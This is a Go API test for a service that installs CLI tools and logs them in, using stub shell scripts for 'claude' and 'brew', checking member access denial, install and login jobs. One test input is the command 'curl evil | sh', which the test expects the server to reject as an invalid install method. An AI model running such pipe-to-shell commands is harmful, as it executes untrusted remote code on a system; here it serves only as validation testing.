package api_test

import (
	"net/http"
	"os"
	"path/filepath"
	"testing"
	"time"
)

func TestCLIToolsAPI(t *testing.T) {
	off := setup(t)
	admin := off.client(t)
	login(t, off, admin, "admin@x.io", "admin-password")
	if _, body := do(t, admin, "GET", off.srv.URL+"/api/cli-tools", nil, nil); body["enabled"] != false {
		t.Fatalf("disabled = %v", body)
	}

	dir := t.TempDir()
	src := t.TempDir()
	os.WriteFile(filepath.Join(src, "claude"), []byte(`#!/bin/sh
OK="$(dirname "$0")/ok"
case "$1 $2" in
  "--version "*) echo 9.9.9;;
  "auth status") if [ -f "$OK" ]; then echo '{"loggedIn":true,"email":"a@b.c"}'; else echo '{"loggedIn":false}'; fi;;
  "auth login") echo https://claude.ai/oauth/x; read C; touch "$OK";;
esac
`), 0o755)
	os.WriteFile(filepath.Join(dir, "brew"), []byte("#!/bin/sh\ncp "+filepath.Join(src, "claude")+" "+dir+"/claude\n"), 0o755)
	cliPath = dir + ":/usr/bin:/bin"
	defer func() { cliPath = "" }()
	e := setup(t)
	admin = e.client(t)
	login(t, e, admin, "admin@x.io", "admin-password")
	member := e.client(t)
	login(t, e, member, "member@x.io", "member-password")
	if resp, _ := do(t, member, "GET", e.srv.URL+"/api/cli-tools", nil, nil); resp.StatusCode != 403 {
		t.Fatalf("member = %d", resp.StatusCode)
	}

	_, body := do(t, admin, "GET", e.srv.URL+"/api/cli-tools/claude", nil, nil)
	if body["installed"] != false {
		t.Fatalf("status = %v", body)
	}
	resp, job := do(t, admin, "POST", e.srv.URL+"/api/cli-tools/claude/install", map[string]any{"method": "brew"}, nil)
	if resp.StatusCode != 202 || job["command"] == nil {
		t.Fatalf("install = %d %v", resp.StatusCode, job)
	}
	waitJob(t, e, admin, job["id"].(string), "succeeded")
	_, body = do(t, admin, "GET", e.srv.URL+"/api/cli-tools/claude", nil, nil)
	if body["installed"] != true || body["auth"].(map[string]any)["logged_in"] != false {
		t.Fatalf("after install = %v", body)
	}

	resp, job = do(t, admin, "POST", e.srv.URL+"/api/cli-tools/claude/login", map[string]any{}, nil)
	if resp.StatusCode != 202 {
		t.Fatalf("login = %d %v", resp.StatusCode, job)
	}
	id := job["id"].(string)
	deadline := time.Now().Add(5 * time.Second)
	for time.Now().Before(deadline) {
		_, job = do(t, admin, "GET", e.srv.URL+"/api/cli-jobs/"+id, nil, nil)
		if len(job["urls"].([]any)) > 0 {
			break
		}
		time.Sleep(50 * time.Millisecond)
	}
	if len(job["urls"].([]any)) == 0 {
		t.Fatalf("no login url: %v", job)
	}
	do(t, admin, "POST", e.srv.URL+"/api/cli-jobs/"+id+"/input", map[string]any{"text": "code-123"}, nil)
	waitJob(t, e, admin, id, "succeeded")
	_, body = do(t, admin, "GET", e.srv.URL+"/api/cli-tools/claude", nil, nil)
	if body["auth"].(map[string]any)["logged_in"] != true {
		t.Fatalf("after login = %v", body)
	}
	if resp, _ := do(t, admin, "POST", e.srv.URL+"/api/cli-tools/claude/install", map[string]any{"method": "curl evil | sh"}, nil); resp.StatusCode != 400 {
		t.Fatalf("bad method = %d", resp.StatusCode)
	}
}

func waitJob(t *testing.T, e *env, c *http.Client, id, state string) {
	t.Helper()
	deadline := time.Now().Add(10 * time.Second)
	for time.Now().Before(deadline) {
		_, job := do(t, c, "GET", e.srv.URL+"/api/cli-jobs/"+id, nil, nil)
		if job["state"] == state {
			return
		}
		time.Sleep(50 * time.Millisecond)
	}
	t.Fatalf("job %s did not reach %s", id, state)
}
